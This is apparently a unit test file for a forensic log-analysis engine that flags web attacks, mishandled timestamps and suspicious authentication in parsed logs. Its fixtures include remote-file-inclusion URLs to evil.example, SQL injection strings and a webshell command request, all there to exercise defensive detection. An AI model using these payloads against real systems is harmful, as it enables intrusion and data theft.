            ("/fetch?template=http%3A%2F%2Fevil.example%2Fs.php", "remote_file_inclusion"),
            ("/i?page=http://evil.example/shell.txt", "remote_file_inclusion"),
        ):
            self.assertIn(
                expected,
                MODULE._http_attack_indicators(request_path),
                msg=f"missed {expected} in {request_path}",
            )

    def test_injection_probing_is_recorded_as_a_low_confidence_attempt(self):
        ts = pd.date_range("2024-06-16T21:30:00Z", periods=3, freq="1s")
        df = pd.DataFrame([
            # sqlmap-style quote/angle breakout probe: no valid SQL syntax.
            {
                "parser": "text/apache_access",
                "http_request": "GET /vuln/?id=2%27gejf%3C%27%22%3Eskpv&Submit=Submit HTTP/1.1",
                "http_response_code": 200,
            },
            {
                "parser": "text/apache_access",
                "http_request": "GET /vuln/?id=3&Submit=Submit HTTP/1.1",
                "http_response_code": 200,
            },
            {
                "parser": "text/apache_access",
                "http_request": (
                    "GET /vuln/?id=1%27%20UNION%20SELECT%20table_name%20"
                    "FROM%20information_schema.tables-- HTTP/1.1"
                ),
                "http_response_code": 200,
            },
        ], index=ts)

        out = self.engine.apply_contextual(self.engine.apply_atomic(df), apply_temporal=False)
        probe, benign, real_sqli = (out.iloc[i]["chronosift_signals"] or {} for i in range(3))

        # The probe is an attempt: its own low-weight signal, no exploitation.
        self.assertEqual(probe.get("web_injection_probe"), 1.0)
        self.assertNotIn("exploit_public_facing_app", probe)
        self.assertNotIn("web_sqli_attempt", probe)
        self.assertNotIn("web_sqli_probable_success", probe)
        self.assertEqual(out.iloc[0]["chronosift_web_outcome"], "attempt")
        self.assertEqual(out.iloc[0]["chronosift_attack_techniques"], "T1190")
        self.assertEqual(probe.get("mitre_t1190"), 1.0)
        entry = next(
            item for item in out.iloc[0]["chronosift_explain"]
            if item.get("rule_id") == "WEB_INJECTION_PROBE"
        )
        self.assertEqual(entry["confidence"], "low")

        # An ordinary lookup stays clean, and a real payload is not downgraded
        # to a probe or double-counted.
        self.assertNotIn("web_injection_probe", benign)
        self.assertEqual(float(out.iloc[1]["chronosift_score"]), 0.0)
        self.assertEqual(real_sqli.get("web_sqli_attempt"), 1.0)
        self.assertNotIn("web_injection_probe", real_sqli)
        self.assertLess(
            float(out.iloc[0]["chronosift_score"]),
            float(out.iloc[2]["chronosift_score"]),
        )

    def test_web_feature_prefilter_keeps_schema_stable_on_non_web_partitions(self):
        ts = pd.date_range("2024-06-16T22:00:00Z", periods=2, freq="1s")
        non_web = pd.DataFrame(
            [{"parser": "filestat", "pathspec": "/home/user/a.txt"},
             {"parser": "filestat", "pathspec": "/home/user/b.txt"}], index=ts,
        )
        web = pd.DataFrame(
            [{"parser": "text/apache_access", "http_request": "GET /x?id=1 HTTP/1.1", "http_response_code": 200},
             {"parser": "text/apache_access", "http_request": "GET /y HTTP/1.1", "http_response_code": 404}], index=ts,
        )
        self.engine._materialise_normalised_web_features(non_web)
        self.engine._materialise_normalised_web_features(web)

        non_web_cols = {c: str(non_web[c].dtype) for c in non_web.columns if c.startswith("chronosift_")}
        web_cols = {c: str(web[c].dtype) for c in web.columns if c.startswith("chronosift_")}
        self.assertEqual(non_web_cols, web_cols)
        self.assertFalse(bool(non_web["chronosift_web_is_event"].any()))
        self.assertTrue(bool(web["chronosift_web_is_event"].all()))
        self.assertTrue(non_web["chronosift_web_method"].isna().all())

    def test_month_window_spans_wide_forensic_years(self):
        # Partition years beyond Python's datetime.MAXYEAR (9999) previously
        # aborted a whole dataset: four junk rows in Case1 (23746, 29326) and
        # three in ENISA-LOT3 (44567, and 9999 whose December end rolls to
        # 10000). Timestamps are retained as evidence rather than clipped, so
        # the window must be constructible for any of them.
        for year, month in ((23746, 7), (29326, 9), (44567, 12), (9999, 12), (10000, 1), (1, 1)):
            start, end = MODULE._month_window_utc(year, month)
            self.assertEqual(start.year, year)
            self.assertEqual(start.month, month)
            self.assertLess(start, end)
            self.assertEqual(str(start.tz), "UTC")

        # December rolls the year over; other months advance within it.
        self.assertEqual(MODULE._month_window_utc(9999, 12)[1].year, 10000)
        self.assertEqual(MODULE._month_window_utc(44567, 12)[1].year, 44568)
        self.assertEqual(MODULE._month_window_utc(23746, 7)[1].month, 8)

    def test_month_window_matches_previous_behaviour_for_ordinary_years(self):
        # The replacement must be a no-op for representable years, so existing
        # sidecars stay valid without reprocessing.
        for year, month in ((1970, 1), (2024, 1), (2024, 12), (2026, 2)):
            start, end = MODULE._month_window_utc(year, month)
            expected_start = pd.Timestamp(year=year, month=month, day=1, tz="UTC")
            expected_end = (
                pd.Timestamp(year=year + 1, month=1, day=1, tz="UTC")
                if month == 12
                else pd.Timestamp(year=year, month=month + 1, day=1, tz="UTC")
            )
            self.assertEqual(start, expected_start)
            self.assertEqual(end, expected_end)

    def test_wide_year_rows_fall_inside_their_partition_window(self):
        index = pd.DatetimeIndex(
            np.array(["23746-07-08T09:58:21.349921"], dtype="datetime64[us]")
        ).tz_localize("UTC")
        start, end = MODULE._month_window_utc(23746, 7)
        self.assertTrue(bool(((index >= start) & (index < end)).all()))

    def test_year_month_iteration_crosses_wide_year_boundaries(self):
        start = MODULE._month_start_timestamp(9999, 11)
        end = MODULE._month_start_timestamp(10000, 2)
        self.assertEqual(
            MODULE._iter_year_months(start, end),
            [(9999, 11), (9999, 12), (10000, 1), (10000, 2)],
        )
        single = MODULE._month_start_timestamp(44567, 12)
        self.assertEqual(MODULE._iter_year_months(single, single), [(44567, 12)])

    def test_partitioned_run_survives_wide_year_partition_end_to_end(self):
        """
        The regression that actually bit: a whole dataset aborted because one
        partition's derived year exceeded Python's datetime.MAXYEAR. The helper
        tests above cover the window arithmetic; this drives the real
        process_parquet_dataset_partitioned() path over a Hive-partitioned
        dataset containing an ordinary partition and a wide-year one, and
        asserts the wide-year row is retained rather than dropped.
        """
        rows = [
            ("2024-06-16T17:30:00", 2024, 6, "/home/user/ordinary.txt"),
            ("2024-06-16T17:31:00", 2024, 6, "/var/www/html/shell.php"),
            # Junk timestamp of the kind the wide-year conversion retains as
            # evidence rather than clipping (cf. Case1 year 23746).
            ("23746-07-08T09:58:21.349921", 23746, 7, "/home/user/tampered.txt"),
        ]

        with tempfile.TemporaryDirectory() as tmpdir:
            root = pathlib.Path(tmpdir) / "dataset"
            for row_id, (stamp, year, month, path) in enumerate(rows):
                part = root / f"year={year}" / f"month={month:02d}"
                part.mkdir(parents=True, exist_ok=True)
                frame = pd.DataFrame({
                    "datetime": np.array([stamp], dtype="datetime64[us]"),
                    MODULE.CHRONOSIFT_ROW_ID_COLUMN: [row_id],
                    "parser": ["filestat"],
                    "timestamp_desc": ["Creation Time"],
                    "pathspec": [path],
                    "message": [f"file {path}"],
                })
                # Unique per row: two of these share a partition directory.
                frame.to_parquet(part / f"part-{row_id:05d}.parquet", engine="pyarrow", index=False)

            out_root = pathlib.Path(tmpdir) / "sidecar"
            reports = self.engine.process_parquet_dataset_partitioned(
                str(root), str(out_root), output_mode="sidecar",
            )

            self.assertTrue(reports, "the run produced no partition reports")
            years = {int(r["year"]) for r in reports if "year" in r}
            self.assertIn(23746, years, "wide-year partition was skipped")

            written = MODULE._duckdb_read_parquet_df(str(out_root), require_datetime=False)
            self.assertEqual(
                sorted(int(v) for v in written[MODULE.CHRONOSIFT_ROW_ID_COLUMN]),
                [0, 1, 2],
                "every row should reach the sidecar, including the wide-year row",
            )

    def test_manifest_hash_index_covers_only_hit_carrying_rows(self):
        # The hash index previously accumulated every hashed row across the
        # whole dataset even though non-hit hashes are discarded when the
        # manifest is finalised.
        manifest = MODULE._finalise_referenced_file_hit_manifest(
            {"/var/www/html/bad.php": {"av"}},
            {},
            set(),
            {"web_document_roots": ["/var/www/html"]},
            {"/var/www/html/bad.php": {"hit_types": {"av"}}},
            {
                "A" * 64: {"/var/www/html/bad.php"},
                "C" * 64: {"/var/www/html/clean.php"},
            },
        )
        self.assertEqual(manifest["hash_hit_map"]["A" * 64], {"av"})
        self.assertNotIn("C" * 64, manifest["hash_hit_map"])

    def test_sqli_probable_success_requires_syntax_success_and_response_anomaly(self):
        ts = pd.date_range("2024-06-16T21:00:00Z", periods=6, freq="1s")
        rows = []
        for response_bytes in (4700, 4720, 4750):
            rows.append({
                "parser": "text/apache_access",
                "http_request": "GET /products?id=1 HTTP/1.1",
                "http_response_code": 200,
                "http_response_bytes": response_bytes,
            })
        rows.extend([
            {
                "parser": "text/apache_access",
                "http_request": (
                    "GET /products?id=1%27%20UNION%20SELECT%20table_name%20"
                    "FROM%20information_schema.tables-- HTTP/1.1"
                ),
                "http_response_code": 200,
                "http_response_bytes": 27000,
            },
            {
                "parser": "text/apache_access",
                "http_request": "GET /products?id=1%27%20OR%201=1-- HTTP/1.1",
                "http_response_code": 302,
                "http_response_bytes": 1,
            },
            {
                "parser": "text/apache_access",
                "http_request": "GET /download/manual.pdf HTTP/1.1",
                "http_response_code": 200,
                "http_response_bytes": 90000,
            },
        ])
        out = self.engine.apply_atomic(
            pd.DataFrame(rows, index=ts),
            materialise_event_columns=True,
        )
        probable = out.iloc[3]["chronosift_signals"]
        redirected = out.iloc[4]["chronosift_signals"]
        large_benign = out.iloc[5]["chronosift_signals"] or {}
        self.assertEqual(probable.get("web_sqli_attempt"), 1.0)
        self.assertEqual(probable.get("web_sqli_response_anomaly"), 1.0)
        self.assertEqual(probable.get("web_sqli_probable_success"), 1.0)
        self.assertEqual(out.iloc[3]["chronosift_web_method"], "GET")
        self.assertEqual(out.iloc[3]["chronosift_web_endpoint"], "/products")
        self.assertIn("sqli:schema_enumeration", out.iloc[3]["chronosift_web_attack_indicators"])
        self.assertEqual(out.iloc[3]["chronosift_web_outcome"], "probable_success")
        self.assertEqual(redirected.get("web_sqli_attempt"), 1.0)
        self.assertNotIn("web_sqli_probable_success", redirected)
        self.assertNotIn("web_sqli_attempt", large_benign)

    def test_web_identity_and_sqli_receive_evidence_qualified_attack_mappings(self):
        ts = pd.date_range("2024-06-16T21:10:00Z", periods=6, freq="1s")
        rows = [
            {
                "parser": "text/apache_access",
                "http_request": "GET /products?id=1 HTTP/1.1",
                "http_headers": "Host: shop.example",
                "http_response_code": 200,
                "http_response_bytes": size,
                "ip_address": "8.8.8.8",
            }
            for size in (4700, 4720, 4750)
        ]
        rows.extend([
            {
                "parser": "text/apache_access",
                "http_request": "GET /products?id=1%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables-- HTTP/1.1",
                "http_headers": "Host: shop.example",
                "http_response_code": 200,
                "http_response_bytes": 27000,
                "ip_address": "8.8.8.8",
            },
            {
                "parser": "text/apache_access",
                "http_request": "GET /shell.php?cmd=id HTTP/1.1",
                "http_headers": "Host: shop.example",
                "http_response_code": 200,
                "http_response_bytes": 200,
                "ip_address": "8.8.8.8",
            },
            {
                "parser": "text/apache_access",
                "http_request": "POST /upload.php HTTP/1.1 filename=Shell.php",
                "http_headers": "Host: shop.example; Content-Type: multipart/form-data; boundary=x",
                "http_response_code": 201,
                "http_response_bytes": 20,
                "ip_address": "8.8.8.8",
            },
        ])
        manifest = {
            "schema_version": 3,
            "hit_map": {},
            "basename_map": {},
            "web_path_map": {"/shell.php": {"av", "yara"}},
            "web_basename_map": {"shell.php": {"av", "yara"}},
            "web_identity_map": {
                "/shell.php": {
                    "hit_types": {"av", "yara"},
                    "av_categories": {MODULE.AV_CAT_WEBSHELL},
                    "av_families": {"C99shell"},
                    "yara_categories": {MODULE.YARA_CAT_WEBSHELL},
                    "yara_rules": {"strong_shell"},
                    "yara_rule_metadata": {
                        "strong_shell": {"category": MODULE.YARA_CAT_WEBSHELL, "score": 90, "quality": 80},
                    },
                },
            },
            "web_basename_identity_map": {
                "shell.php": {
                    "hit_types": {"av", "yara"},
                    "av_categories": {MODULE.AV_CAT_WEBSHELL},
                    "yara_categories": {MODULE.YARA_CAT_WEBSHELL},
                },
            },
        }
        out = self.engine.apply_atomic(pd.DataFrame(rows, index=ts))
        out = self.engine.apply_contextual(
            out,
            apply_temporal=False,
            file_hit_manifest=manifest,
        )

        sqli = out.iloc[3]
        shell = out.iloc[4]
        upload = out.iloc[5]
        self.assertEqual(sqli["chronosift_signals"].get("mitre_t1190"), 1.0)
        self.assertEqual(sqli["chronosift_signals"].get("mitre_t1213_006"), 1.0)
        self.assertEqual(sqli["chronosift_attack_techniques"], "T1190|T1213.006")
        self.assertEqual(shell["chronosift_signals"].get("web_confirmed_webshell_access"), 1.0)
        self.assertEqual(shell["chronosift_signals"].get("mitre_t1505_003"), 1.0)
        self.assertEqual(shell["chronosift_web_file_categories"], "webshell")
        self.assertEqual(shell["chronosift_web_outcome"], "confirmed_follow_on")
        self.assertEqual(shell["chronosift_attack_techniques"], "T1505.003")
        self.assertEqual(upload["chronosift_signals"].get("mitre_t1105"), 1.0)
        self.assertEqual(upload["chronosift_attack_techniques"], "T1105")

    def test_external_sensitive_download_is_not_overmapped_to_exfiltration(self):
        ts = pd.to_datetime(["2024-06-16T21:20:00Z"], utc=True)
        manifest = {
            "schema_version": 3,
            "hit_map": {},
            "basename_map": {},
            "web_path_map": {"/exports/cards.sql": {"luhn"}},
            "web_basename_map": {"cards.sql": {"luhn"}},
            "web_identity_map": {"/exports/cards.sql": {"hit_types": {"luhn"}}},
            "web_basename_identity_map": {"cards.sql": {"hit_types": {"luhn"}}},
        }
        df = pd.DataFrame([{
            "parser": "text/nginx_access",
            "http_request": "GET /exports/cards.sql HTTP/1.1",
            "http_response_code": 200,
            "http_response_bytes": 100000,
            "ip_address": "8.8.8.8",
        }], index=ts)
        out = self.engine.apply_contextual(
            self.engine.apply_atomic(df),
            apply_temporal=False,
            file_hit_manifest=manifest,
        )
        signals = out.iloc[0]["chronosift_signals"]
        self.assertEqual(signals.get("web_external_sensitive_transfer"), 1.0)
        self.assertTrue(pd.isna(out.iloc[0]["chronosift_attack_techniques"]))

    def test_normalised_rfi_feature_maps_t1190_without_success_claim(self):
        ts = pd.to_datetime(["2024-06-16T21:21:00Z"], utc=True)
        df = pd.DataFrame([{
            "parser": "text/apache_access",
            "http_request": "GET /fetch?template=http%3A%2F%2Fevil.example%2Fs.php HTTP/1.1",
            "http_response_code": 404,
            "http_response_bytes": 50,
        }], index=ts)
        out = self.engine.apply_contextual(
            self.engine.apply_atomic(df),
            apply_temporal=False,
        )
        row = out.iloc[0]
        self.assertIn("remote_file_inclusion", row["chronosift_web_attack_indicators"])
        self.assertEqual(row["chronosift_signals"].get("mitre_t1190"), 1.0)
        self.assertEqual(row["chronosift_web_outcome"], "attempt")
        self.assertEqual(row["chronosift_attack_techniques"], "T1190")

    def test_json_text_serialisers_preserve_nulls_and_payloads(self):
        nested = pd.DataFrame({
            "chronosift_explain": [None, [{"rule_id": "R1"}]],
            "other": [1, 2],
        })
        fallback = MODULE._prepare_nested_columns_json_fallback(nested, ["chronosift_explain"])
        self.assertEqual(str(fallback["chronosift_explain"].dtype), "string")
        self.assertTrue(pd.isna(fallback.iloc[0]["chronosift_explain"]))
        self.assertEqual(json.loads(fallback.iloc[1]["chronosift_explain"]), [{"rule_id": "R1"}])

        source = pd.DataFrame({
            "timestamp": [1718562000000000, 1718562060000000],
            "payload": [None, {"alpha": 1}],
        })
        normalised, _ = MODULE.normalise_for_parquet(source.copy(), verbose=False)
        self.assertEqual(str(normalised["payload"].dtype), "string")
        self.assertTrue(pd.isna(normalised.iloc[0]["payload"]))
        self.assertEqual(json.loads(normalised.iloc[1]["payload"]), {"alpha": 1})

    def test_stable_arrow_signal_schema_across_heterogeneous_parquet_files(self):
        first = pd.DataFrame({
            "chronosift_row_id": [1, 2],
            "chronosift_signals": [
                {"archive_created": 1.0},
                {"web_sqli_attempt": 1.0, "web_sqli_probable_success": 1.0},
            ],
            "chronosift_explain": [
                [{"rule_id": "ARCHIVE", "evidence": {"size": 10}}],
                [{"rule_id": "SQLI", "evidence": {"indicators": ["union_select"]}}],
            ],
        })
        second = pd.DataFrame({
            "chronosift_row_id": [3],
            "chronosift_signals": [{"web_malicious_file_access": 1.0}],
            "chronosift_explain": [[{
                "rule_id": "WEB_FILE",
                "evidence": {"http_response_code": 200, "file_hit_types": "av|yara"},
            }]],
        })

        with tempfile.TemporaryDirectory() as tmpdir:
            paths = []
            for number, frame in enumerate((first, second)):
                outfile = pathlib.Path(tmpdir) / f"part-{number:05d}.parquet"
                mode = MODULE._write_parquet_subchunk(
                    frame,
                    outfile,
                    {"engine": "pyarrow", "index": False},
                    nested_columns_encoding="arrow",
                )
                self.assertEqual(mode, "nested")
                paths.append(str(outfile))

            con = MODULE.duckdb.connect()
            described = dict(
                (row[0], row[1])
                for row in con.execute(
                    "DESCRIBE SELECT * FROM read_parquet(?, union_by_name=1)",
                    [paths],
                ).fetchall()
            )
            rows = con.execute(
                """
                SELECT
                    chronosift_row_id,
                    map_extract_value(chronosift_signals, 'web_sqli_probable_success'),
                    map_extract_value(chronosift_signals, 'web_malicious_file_access'),
                    chronosift_explain
                FROM read_parquet(?, union_by_name=1)
                ORDER BY chronosift_row_id
                """,
                [paths],
            ).fetchall()
            loaded = MODULE._duckdb_read_parquet_df(
                tmpdir,
                require_datetime=False,
            ).sort_values("chronosift_row_id")

        self.assertEqual(described["chronosift_signals"], "MAP(VARCHAR, DOUBLE)")
        self.assertEqual(described["chronosift_explain"], "VARCHAR[]")
        self.assertEqual(rows[1][1], 1.0)
        self.assertEqual(rows[2][2], 1.0)
        self.assertEqual(json.loads(rows[2][3][0])["evidence"]["http_response_code"], 200)
        self.assertEqual(loaded.iloc[1]["chronosift_signals"]["web_sqli_probable_success"], 1.0)
        self.assertEqual(loaded.iloc[2]["chronosift_explain"][0]["rule_id"], "WEB_FILE")

    def test_normalise_for_parquet_preserves_object_type_coercions(self):
        source = pd.DataFrame({
            "timestamp": [1718562120000000, 1718562180000000],
            "string_obj": pd.Series(["alpha", "beta"], dtype=object),
            "bool_obj": pd.Series([True, False], dtype=object),
            "int_obj": pd.Series([1, 2], dtype=object),
            "float_obj": pd.Series([1.5, 2.5], dtype=object),
            "mixed_obj": pd.Series(["x", 7], dtype=object),
            "nested_obj": pd.Series([{"alpha": 1}, None], dtype=object),
        })
        normalised, _ = MODULE.normalise_for_parquet(source.copy(), verbose=False)

        self.assertEqual(str(normalised["string_obj"].dtype), "string")
        self.assertEqual(str(normalised["bool_obj"].dtype), "boolean")
        self.assertEqual(str(normalised["int_obj"].dtype), "Int64")
        self.assertEqual(str(normalised["float_obj"].dtype), "float64")
        self.assertEqual(str(normalised["mixed_obj"].dtype), "string")
        self.assertEqual(str(normalised["nested_obj"].dtype), "string")
        self.assertEqual(json.loads(normalised.iloc[0]["nested_obj"]), {"alpha": 1})
        self.assertTrue(pd.isna(normalised.iloc[1]["nested_obj"]))

    def test_normalise_for_parquet_preserves_timestamp_with_wide_year(self):
        source = pd.DataFrame({
            "timestamp": [1718562120000000, 1344260469241068412],
            "parser": ["filestat", "utmp"],
        })

        normalised, _ = MODULE.normalise_for_parquet(
            source, verbose=False
        )

        self.assertEqual(len(normalised), 2)
        self.assertEqual(str(normalised["year"].dtype), "Int32")
        self.assertEqual(normalised["year"].tolist(), [2024, 44567])

    def test_hash_enrichment_csv_aligns_once_and_preserves_unmatched_existing_values(self):
        sha_a = "A" * 64
        sha_b = "B" * 64
        source = pd.DataFrame({
            "sha256_hash": [f" {sha_a.lower()} ", sha_b.lower(), None],
            "enriched_flag": [pd.NA, "existing", "keep"],
        })
        with tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False) as tmp:
            tmp.write("sha256,enriched_flag,extra_note\n")
            tmp.write(f"{sha_a},yes,from_csv\n")
            tmp.write(f"{sha_b},,\n")
            csv_path = tmp.name
        try:
            out = self.engine._apply_hash_enrichment_csv(source.copy(), csv_path)
        finally:
            pathlib.Path(csv_path).unlink(missing_ok=True)

        self.assertEqual(out.iloc[0]["enriched_flag"], "yes")
        self.assertEqual(out.iloc[0]["extra_note"], "from_csv")
        self.assertEqual(out.iloc[1]["enriched_flag"], "existing")
        self.assertTrue(pd.isna(out.iloc[1]["extra_note"]))
        self.assertEqual(out.iloc[2]["enriched_flag"], "keep")
        self.assertTrue(pd.isna(out.iloc[2]["extra_note"]))

    def test_load_hash_hit_set_from_csv_handles_index_backed_string_filtering(self):
        sha_a = "A" * 64
        sha_b = "B" * 64
        sha_c = "C" * 64
        with tempfile.NamedTemporaryFile("w", suffix=".csv", delete=False) as tmp:
            tmp.write("sha256,av_hit\n")
            tmp.write(f" {sha_a} ,yes\n")
            tmp.write(f"{sha_b},0\n")
            tmp.write(f"{sha_c}, true \n")
            tmp.write(",yes\n")
            csv_path = tmp.name
        try:
            hits = MODULE._load_hash_hit_set_from_csv(csv_path, "av_hit")
        finally:
            pathlib.Path(csv_path).unlink(missing_ok=True)

        self.assertEqual(hits, {sha_a, sha_c})

    def test_nsrl_cache_enrichment_aligns_duplicate_hash_rows_and_candidate_mask(self):
        sha_a = "A" * 64
        sha_b = "B" * 64
        sha_c = "C" * 64
        source = pd.DataFrame({
            "sha256_hash": [sha_a.lower(), sha_a.lower(), sha_b.lower(), sha_c.lower()],
            "filename": ["alpha.exe", "alpha-copy.exe", "", "charlie.exe"],
            "nsrl_application_type": ["stale", "stale", "stale", "stale"],
            "nsrl_is_os_component": [True, True, True, True],
        })
        cache = pd.DataFrame({
            "sha256": [sha_a, sha_b],
            "nsrl_application_type": ["Operating System", "Browser"],
            "nsrl_is_os_component": [True, False],
        })

        out = self.engine._apply_nsrl_enrichment_from_cache(source.copy(), cache)

        self.assertEqual(out.iloc[0]["nsrl_application_type"], "Operating System")
        self.assertEqual(out.iloc[1]["nsrl_application_type"], "Operating System")
        self.assertTrue(bool(out.iloc[0]["nsrl_is_os_component"]))
        self.assertTrue(bool(out.iloc[1]["nsrl_is_os_component"]))
        self.assertTrue(pd.isna(out.iloc[2]["nsrl_application_type"]))
        self.assertFalse(bool(out.iloc[2]["nsrl_is_os_component"]))
        self.assertTrue(pd.isna(out.iloc[3]["nsrl_application_type"]))
        self.assertFalse(bool(out.iloc[3]["nsrl_is_os_component"]))

    def test_subset_sparse_state_preserves_positional_order_for_duplicate_timestamps(self):
        ts = pd.to_datetime([
            "2024-06-16T18:00:00Z",
            "2024-06-16T18:00:00Z",
            "2024-06-16T18:01:00Z",
        ], utc=True)
        df = pd.DataFrame({
            "chronosift_row_id": [10, 11, 12],
            "value": ["a", "b", "c"],
        }, index=ts)
        signal_map = {0: {"x": 1.0}, 2: {"z": 1.0}}
        explain_map = {0: [{"rule_id": "R0"}], 2: [{"rule_id": "R2"}]}
        mask = pd.Series([True, False, True], index=df.index)
        sub, new_signal_map, new_explain_map, old_to_new = self.engine._subset_sparse_state(
            df,
            signal_map,
            explain_map,
            mask,
            columns=["chronosift_row_id", "value"],
        )
        self.assertEqual(sub["chronosift_row_id"].tolist(), [10, 12])
        self.assertEqual(old_to_new, {0: 0, 2: 1})
        self.assertEqual(new_signal_map[0]["x"], 1.0)
        self.assertEqual(new_signal_map[1]["z"], 1.0)
        self.assertEqual(new_explain_map[0][0]["rule_id"], "R0")
        self.assertEqual(new_explain_map[1][0]["rule_id"], "R2")

    def test_candidate_window_mask_matches_reference_with_duplicate_hit_timestamps(self):
        ts = pd.to_datetime([
            "2024-06-16T19:00:00Z",
            "2024-06-16T19:00:00Z",
            "2024-06-16T19:01:00Z",
            "2024-06-16T19:02:00Z",
            "2024-06-16T19:02:00Z",
        ], utc=True)
        df = pd.DataFrame({"chronosift_score": [0.0] * 5}, index=ts)
        base_mask = pd.Series([True, True, False, True, False], index=df.index)
        actual = self.engine._build_candidate_window_mask(df, base_mask=base_mask, window="30s")

        expected_arr = base_mask.to_numpy(dtype=bool, copy=True)
        for ts_val in df.index[base_mask]:
            left = df.index.searchsorted(ts_val - pd.Timedelta("30s"), side="left")
            right = df.index.searchsorted(ts_val + pd.Timedelta("30s"), side="right")
            expected_arr[left:right] = True
        expected = pd.Series(expected_arr, index=df.index)

        self.assertEqual(actual.tolist(), expected.tolist())

    def test_auth_sparse_prefilter_ignores_stale_signal_map_keys(self):
        ts = pd.to_datetime(["2024-06-16T20:00:00Z"], utc=True)
        df = pd.DataFrame([{
            "auth_outcome": "success",
            "auth_protocol": "ssh",
            "auth_direction": "inbound",
            "message": "Accepted password for alice from 10.0.0.5",
        }], index=ts)
        signal_map = {5: {"rdp_success": 1.0}}
        explain_map = {}

        self.engine._apply_canonical_auth_signals_sparse(df, signal_map, explain_map)

        self.assertIn(0, signal_map)
        self.assertGreater(float(signal_map[0].get("auth_success", 0.0)), 0.0)
        self.assertIn(5, signal_map)
        self.assertEqual(float(signal_map[5].get("rdp_success", 0.0)), 1.0)

    def test_canonical_auth_signals_preserve_remote_and_invalid_user_inference(self):
        ts = pd.to_datetime(["2024-06-16T20:10:00Z", "2024-06-16T20:11:00Z"], utc=True)
        df = pd.DataFrame([
            {
                "auth_outcome": " Success ",
                "auth_protocol": " SSH ",
                "auth_direction": " remote ",
                "logon_type": "10",
                "message": "Accepted password for alice from 10.0.0.8",
                "authentication_package": " NTLM ",
            },
            {
                "auth_outcome": " failure ",
                "auth_protocol": " kerberos ",
                "auth_direction": " local ",
                "logon_type": "3",
                "message": " Invalid User bob from 10.0.0.5 ",
                "authentication_package": " Negotiate ",
            },
        ], index=ts)
        signal_map = {}
        explain_map = {}

        self.engine._apply_canonical_auth_signals_sparse(df, signal_map, explain_map)

        row0 = signal_map.get(0, {})
        row1 = signal_map.get(1, {})
        self.assertGreater(float(row0.get("auth_success", 0.0)), 0.0)
        self.assertGreater(float(row0.get("auth_remote_success", 0.0)), 0.0)
        self.assertGreater(float(row0.get("auth_remote_shell_success", 0.0)), 0.0)
        self.assertGreater(float(row0.get("auth_remote_interactive_success", 0.0)), 0.0)
        self.assertGreater(float(row0.get("auth_ntlm_remote", 0.0)), 0.0)
        self.assertGreater(float(row1.get("auth_failure", 0.0)), 0.0)
        self.assertGreater(float(row1.get("auth_local_failure", 0.0)), 0.0)
        self.assertGreater(float(row1.get("auth_invalid_user", 0.0)), 0.0)

    def test_trust_dampening_uses_normalised_actor_ip_and_asn_values(self):
        original_cfg = self.engine.trust_dampening_cfg
        self.engine.trust_dampening_cfg = {
            "enabled": True,
            "multiplier": 0.5,
            "trusted_actor_principals": ["admin@example.com"],
            "trusted_ips": ["10.0.0.9"],
            "trusted_asns": ["AS64500"],
            "signals": ["impossible_travel", "new_asn"],
        }
        try:
            ts = pd.to_datetime(
                ["2024-06-16T20:20:00Z", "2024-06-16T20:21:00Z", "2024-06-16T20:22:00Z"],
                utc=True,
            )
            df = pd.DataFrame([
                {"actor_principal": " Admin@Example.Com ", "ip_address": "", "geo_asn": ""},
                {"actor_principal": "", "ip_address": " 10.0.0.9 ", "geo_asn": ""},
                {"actor_principal": "", "ip_address": "", "geo_asn": " AS64500 "},
            ], index=ts)
            signal_map = {
                0: {"impossible_travel": 1.0},
                1: {"new_asn": 1.0},
                2: {"impossible_travel": 1.0, "new_asn": 1.0},
            }
            explain_map = {}

            self.engine._apply_trust_dampening_sparse(df, signal_map, explain_map)

            self.assertEqual(float(signal_map[0]["impossible_travel"]), 0.5)
            self.assertEqual(float(signal_map[1]["new_asn"]), 0.5)
            self.assertEqual(float(signal_map[2]["impossible_travel"]), 0.5)
            self.assertEqual(float(signal_map[2]["new_asn"]), 0.5)
        finally:
            self.engine.trust_dampening_cfg = original_cfg


if __name__ == "__main__":
    unittest.main()
